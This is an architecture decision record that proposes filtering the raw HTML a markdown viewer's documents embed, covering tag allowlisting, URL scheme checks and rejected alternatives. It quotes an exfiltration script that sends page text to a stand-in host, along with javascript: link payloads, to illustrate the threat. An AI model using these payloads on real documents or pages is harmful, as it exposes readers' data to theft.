---
id: 2026-09-01-filter-embedded-html
status: Proposed
supersedes: null
superseded-by: null
components: [core, render, cli, app]
date: 2026-09-01
ticket: null
---
# Filter the HTML a document embeds, in the core, with no way to turn it off

## Context

Markdown lets a document contain raw HTML, and `pulldown-cmark` passes it
through: `html::push_html` writes `Event::Html` and `Event::InlineHtml`
verbatim. Until now `render.rs` did nothing about that, so this markdown file

```markdown
<script>fetch('https://evil.test/?' + document.body.innerText)</script>
```

did exactly what it looks like, in two places.

**In the window.** The shell page is one origin with one script context, and
`shell.js` holds `window.webkit.messageHandlers.mark` — the bridge whose
`toggle` message writes a byte into the reader's file and whose `link` message
opens one. A document's script shares that context. So opening a `.md` file
someone sent you handed that file's author the ability to write to your
documents, read whatever the page could reach, and send it anywhere. A `.md` is
a thing people clone, download, and are sent; this is not an exotic threat
model.

**In `mark render --html`.** The README calls that output "self-contained: both
palettes, inline MathML and SVG, no JavaScript", and `cli.rs` has asserted
`!html.contains("<script")` since M1 — but only against `fixtures/mixed.md` and
`fixtures/rich.md`, which are documents *we* wrote. The claim was tested for our
own corpus and false for anybody else's.

Two constraints shape the fix.

**`pulldown-cmark` does not emit balanced HTML.** It emits lines. A `<details>`
that wraps markdown arrives as `Html("<details>\n")` in one `HtmlBlock`, then
the enclosed markdown as ordinary parsed events, then `Html("</details>\n")` in
a *different* `HtmlBlock` some blocks later. This is measured, not assumed —
`Parser::into_offset_iter` on the case gives exactly that.

**ADR-5's rule that the CLI and the GUI cannot diverge.** Both consume one core;
that is what stops `mark render --html` and the window disagreeing about what a
document means.

## Decision

**Raw HTML is filtered in the core's render path**, in `flush`, where the
untouched-event run is handed to `pulldown-cmark`'s writer. `sanitize::fragment`
rewrites each `Event::Html` and `Event::InlineHtml` before the writer sees it.

The filter is **streaming and tag-at-a-time**. It never balances, never holds
state between events, and is therefore correct on a fragment that opens an
element it will not close. Its rules:

1. **An allowed tag is re-serialized, never passed through** — parsed into a
   name and attributes, and written afresh from the parts that survive, with
   every value escaped.
2. **Everything else is escaped to visible text.** `<script>` becomes
   `&lt;script&gt;` and its body shows as text.
3. **`style` is neither an attribute nor a tag.** Both dropped.
4. **A URL attribute keeps its value only if the scheme is relative, `http`,
   `https`, `mailto`, or `tel`.**

**The same scheme rule applies to destinations markdown itself wrote.**
`[click](javascript:alert(1))` is not raw HTML and never reaches the fragment
filter, so the render path checks `Tag::Link` and `Tag::Image` with the same
`sanitize::safe_url` and empties the destination when it fails. Two spellings of
one thing must not get two answers. This was found by the end-to-end test, not
by design, which is the argument for having written that test against the binary.

**There is no flag to disable it.** ADR-5 forbids the CLI and the GUI diverging,
and a `--allow-html` is a divergence with a security boundary on one side.

Filtering happens at **render**, not at parse. `Document::parse` stays a
faithful record of the document, spans keep pointing at the bytes they came
from, and only the thing that produces HTML for a browser takes the opinion.

## Consequences

**Easier.** `mark render --html` is now self-contained for documents we did not
write, which is what the README always claimed. A document from anywhere can be
opened without handing its author the bridge. The claim is enforced by a test
against a deliberately hostile fixture rather than against our own corpus.

**Harder, and accepted: this is a behaviour change for existing documents.**
A note that embeds an `<iframe>` — an embedded video, a map — stops rendering
it and shows the tag as text instead. That is the correct default for a viewer
and it is still a regression for someone who was relying on it. Escaping to
visible text rather than deleting is the concession: the reader can see what
did not render and why, instead of finding a blank space.

**A hand-written filter is a liability, and is one on purpose.** `ammonia` is
the right tool for sanitizing HTML and is not usable here: it parses a fragment
into a tree and re-serializes it, which balances tags, which destroys a
`<details>` that closes three blocks later. Writing one by hand is the
alternative with the *smaller* failure mode, but it is still code that has to be
right. The mitigations are structural rather than diligent: rule 1 means nothing
from the document reaches the output as markup, so the classic
break-out-of-the-attribute attacks have nothing to break out of; and rule 2 means
an unrecognised construct fails closed, as text, rather than open.

**Entity-encoded schemes are handled by rule 1 rather than by a decoder.**
`java&#9;script:` is not dropped — it is emitted with its `&` escaped, so the
browser never decodes it into a scheme. This is worth stating because it looks
like a gap in `safe_url` and is not; it is a property of re-serializing.

**The allowlist will be wrong for somebody.** It is a `const` in
`core/src/sanitize.rs` with a test per decision, which is the cheapest thing to
argue with.

**Unmeasured, and stated as such:** the cost of the filter on the ADR-2
first-paint budget. It runs only over `Event::Html` and `Event::InlineHtml`, and
the corpus the budget was set against contains no raw HTML at all, so the
benchmark cannot see it either way. A document that is mostly embedded HTML is
untested for speed.

Constraints this imposes on future work:

- **Nothing may reintroduce a passthrough for document HTML**, including a
  "trusted document" mode, a per-file opt-in, or a CLI flag.
- **A new URL-bearing attribute must be added to `URL_ATTRIBUTES` in the same
  change that adds it to `TAG_ATTRIBUTES`.** An attribute allowed but not
  scheme-checked is the whole bug, in miniature.
- **Anything else that emits document-derived HTML goes through
  `sanitize::fragment`.** There is one such path today (`render::flush`); a
  second one that forgets is a silent reopening.
- **`svg` and `math` stay disallowed as *input*.** The core emits both itself
  (ADR-5) and that output does not pass through this filter, because it never
  came from the document.

**Deliberately not decided here:** whether the shell should also carry a
Content-Security-Policy as defence in depth. It should — the filter is the only
thing standing between a document and the bridge, and one layer is one layer —
but a CSP on a `WKURLSchemeHandler` origin needs its own measurement of what it
breaks, and this ADR is already the change that closes the hole.

## Alternatives considered

- **`ammonia`.** The standard, well-audited answer, and unusable: it balances
  tags, and `pulldown-cmark`'s fragments are deliberately unbalanced. Using it
  would silently close every `<details>` at the end of its first line.
- **Escape all embedded HTML.** Two lines, unarguably safe, and it breaks every
  note using `<kbd>`, `<sub>`, or `<details>` — constructs markdown cannot
  express and that this repository's own README and reference both use.
- **Filter in Swift, in the shell.** Rejected on ADR-5: it would leave
  `mark render --html` unfiltered, so the CLI and the GUI would disagree about
  what a document is, which is the thing the single-core design exists to
  prevent.
- **Strip HTML at parse time.** Rejected: `Document::parse` is the source of
  truth for byte spans, task offsets, and the diff, and none of those should
  change because of a rendering policy.
- **A CSP instead of a filter.** Complementary, not a substitute: a CSP would
  not stop a document restyling the page into a phishing form, and it is one
  header away from being wrong. Noted above as the next layer.
